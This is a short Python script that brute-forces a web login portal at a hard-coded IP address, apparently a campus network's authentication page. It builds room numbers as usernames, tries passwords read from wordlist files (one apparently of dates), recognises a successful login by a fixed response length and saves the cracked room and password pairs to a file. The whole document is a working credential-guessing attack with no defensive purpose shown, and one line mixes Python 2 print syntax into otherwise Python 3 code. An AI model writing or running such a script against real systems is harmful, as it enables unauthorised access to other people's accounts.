import requests

def postform(room, passwd):
    url = 'http://218.195.105.242'
    form = {'0MKKey': '123456', 'DDDDD': room, 'R1': '0', 'R2': '1', 'para': '00', 'upass': passwd}
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Languang': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Referer': url, 
            'host': '218.195.105.242', 
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0'
            }

    r = requests.post(url, data = form, headers=headers)

    # print(r.headers['Content-Length'])
    # print(r.text)

    return r.headers['Content-Length']


if __name__ == "__main__":
    todo = 0
    for i in range(7,9):
        print(i)
        for j in range(1,6):
            print(j)
            for k in range(1,9):
                print(k)
                room = str(i) + str(j) + '0' + str(k)
                if room == '2103' or room == '2306' or room == '6201' or room == '6203' or room == '1301' or room == '3103':
                    todo+=1
                    continue
                #datepass = open("./datepass", "r")
                datepass1 = open("./datepass1", "r")
                roompass = open("./roompass1", "r")
                
                passwd = roompass.readlines()[todo]
                todo+=1
                #print(passwd)
                rea = postform(room, passwd)
                if rea == '3547':
                    print room
                    print("room")
                    continue

                while True:
                    line=datepass1.readline()
                    if line:
                        re = postform(room, line)
                        if re == '3547':
                            print(room)
                            print(line)
                            success = open("./success1", "a")
                            success.write(room + "\n" + line + "\n")
                            success.close()
                            break
                    else:
                        break

                #datepass.close()
                datepass1.close()
                roompass.close()

